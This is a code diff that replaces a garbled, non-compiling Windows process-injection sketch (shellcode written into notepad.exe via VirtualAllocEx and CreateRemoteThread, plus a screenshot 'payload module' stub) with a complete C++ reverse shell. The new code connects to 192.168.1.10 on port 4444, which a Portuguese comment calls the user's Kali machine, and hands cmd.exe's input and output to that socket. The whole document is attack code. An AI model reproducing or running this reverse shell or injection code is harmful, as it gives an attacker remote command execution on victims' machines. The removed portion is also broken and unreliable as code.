@@ -1,115 +1,29 @@
-#include <fstream>
+#include <winsock2.h>
+#include <windows.h>
+#include <ws2tcpip.h>
 
-#include <iostream>
+#pragma comment(lib, "ws2_32")
 
-DWORD findProcessId(const std::wstring& processName) {
+int main() {
+    WSADATA wsaData;
+    SOCKET sock;
+    sockaddr_in target;
+    WSAStartup(MAKEWORD(2,2), &wsaData);
 
-PROCESSENTRY32pe32 = {sizeof(PROCESSENTRY32)}
+    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
+    target.sin_family = AF_INET;
+    target.sin_port = htons(4444);
+    target.sin_addr.s_addr = inet_addr("192.168.1.10"); // IP do seu Kali
 
-    do  {
+    if (connect(sock, (sockaddr*)&target, sizeof(target)) != SOCKET_ERROR) {
+        STARTUPINFOA si = {0};
+        PROCESS_INFORMATION pi = {0};
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESTDHANDLES;
+        // Redireciona entrada/saída para o socket
+        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
 
-        if(!processName.compare(pe32.szExeFile)){
-        
-        }
-        
-            } while (Process32Next(snapshot,&pe32));
-
-            CloseHandle(snapshot);
-
-            return 0;
-
-        }
-            return pe32.th32ProcessID;
-        
-
-        return 0;
-    
-
-
-    int main(){
-
-        DWORD pid = findProcessID(L"notepad.exe");
-
-        if(!pid){
-          std::cerr<<"Target process not found." <<
-          std::endl;
-
-          return 1;
-
-        }
-
-          HANDLE process = Open-Process(PROCESS_ALL_ACCESS,False,pid);
-
-          if(!process){
-
-            std::cerr<<"Failed to open target process."<<
-            std::endl;
-
-          }
-
-          return 1;
-
-        }
-
-        unsigned char payload[] =
-        "\xfc\x48\x83...";//shell-code placeholder
-        
-        SIZE_T payloadSize =
-        sizeof(payload);
-
-        void* alloc = VirtualAllocEx(process,nullptr,
-        payloadSize,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READ-WRITE);
-
-        WriteProcessMemory(process,alloc,payloadSize,nullptr);
-
-        CreateRemoteThread(
-        process,nullptr,0,(LPTHREAD_START_ROUTINE)alloc,nullptr,0,nullptr);
-        
-        CloseHandle(process);
-
-        return 0;
-
-        }
-
-        void run_shellcode(unsigned char* shellcode){
-        __asm {
-        
-        mov eax, shellcode
-
-
-        call eax
-        }
-
-
-        }
-
-        class PayloadModule {
-        
-        public:
-
-        virtual void Execute() = 0;
-
-        
-        virtual~PayloadModule()
-        {}
-
-
-        class ScreenshotModule:
-        public PayloadModule{
-        
-        public:
-
-
-        void Execute()override{
-    
-        
-        // Implementation for
-        // screen capture
-
-
-        }
-
-        };
-
-        }
-        
+        CreateProcessA(nullptr, (LPSTR)"cmd.exe", nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi);
+    }
+    return 0;
+}
